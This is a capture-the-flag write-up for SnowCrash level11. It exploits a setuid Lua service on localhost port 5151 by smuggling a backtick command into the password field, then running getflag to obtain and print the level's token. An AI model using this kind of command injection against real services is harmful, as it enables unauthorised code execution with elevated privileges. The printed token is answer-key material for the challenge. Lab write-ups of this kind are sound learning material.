### Level11

We can see a script in the HOME, we can see that the suid/guid is active. This means that everything will be executed as flag11. After displaying the program we also know for sure that's listening on port 5151 of the localhost.

`local server = assert(socket.bind("127.0.0.1", 5151))`

We also know that it won't display the output of a command for example because it takes our content, hashes it and compares it to a string:

```
local h = hash(l)
if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
	client:send("Erf nope..\n");
```

To begin, let's run the following command and look at the result:
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `echo Hello World` > /tmp/output
Erf nope..
level11@SnowCrash:~$ cat /tmp/output
Hello World
```

The execution works fine and we can retrieve the contents. Now we just need to change the echo to getflag and we get :

`Check flag.here is your token: fa6v5ateaw21peobuub8ipe6s`
